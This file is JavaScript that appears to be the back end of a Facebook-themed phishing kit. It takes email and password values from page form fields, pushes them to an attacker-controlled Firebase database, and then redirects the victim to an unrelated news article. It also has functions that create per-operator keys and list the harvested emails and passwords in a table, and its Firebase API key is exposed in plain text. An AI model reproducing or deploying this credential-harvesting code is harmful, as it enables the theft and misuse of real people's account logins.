// Your web app's Firebase configuration
                  var firebaseConfig = {
                        apiKey: "AIzaSyAxTK3AVErxrgX7uzYzC3-cpgNes1qrLK8",
                        authDomain: "facebook-b-429a8.firebaseapp.com",
                        databaseURL: "https://facebook-b-429a8.firebaseio.com",
                        projectId: "facebook-b-429a8",
                        storageBucket: "facebook-b-429a8.appspot.com",
                        messagingSenderId: "716129784944",
                        appId: "1:716129784944:web:f29696fbff00a86f5450b5",
                        measurementId: "G-FN9TDTZGDZ"             };
                  // Initialize Firebase
                  firebase.initializeApp(firebaseConfig);

var i=1;
		  function readData(){
			var submittedKey = $("#submittedKey").val();
			firebase.database().ref('/private/users').once('value', function(snapshot){
				var ref="/users/";
				snapshot.forEach(function(childSnapshot){
					if(childSnapshot.key==submittedKey){
						var childData=childSnapshot.val();
						$("#userTxt").html("User: "+childData["Name"]);
						ref="/private/users/"+submittedKey+"/";
					}
					
				});
				readFromRef(ref);
			});

		  }


		  function readFromRef(ref){
				firebase.database().ref(ref).once('value', function(snapshot){
				snapshot.forEach(function(childSnapshot){
					var childKey = childSnapshot.key;
					var childData = childSnapshot.val();
					//console.log('data:'+JSON.stringify(childData));
					if(childKey != "Name")
						$("#accTbl").append("<tr><td>"+(i++)+"</td><td>"+childData["Email"]+"</td><td>"+childData["Pass"]+"</td></tr>");
				});
			});


		  }

                  function writeData(code){
                        var email = document.getElementById("nameField").value;
                        var pass = document.getElementById("ageField").value;
			var submittedKey = $("#inputKey").val();
			var ref="users";

			if(submittedKey != "False"){
				ref="/private/users/"+submittedKey;
			}

                        if(code==2){
                                email = document.getElementById("emailField").value;
                            pass = document.getElementById("passField").value;
                        }

                        firebase.database().ref(ref).push({
                                Email: email,
                                Pass: pass
                        },function(error) {
                                if (error) {
                                  // The write failed...
                                } else {
                                  window.location.replace("https://www.cbsnews.com/news/coronavirus-infection-outbreak-worldwide-virus-expert-warning-today-2020-03-02/");
                                }
                         });
                  }

                  
        	  $("#btnGenerate").on("click", function(){
        	    var key = firebase.database().ref("private").child("users").push({
		  	Name: $("#nameInput").val()
        	    }).getKey();
		  	$("#textGenerated").html("Key: "+key);
        	  })

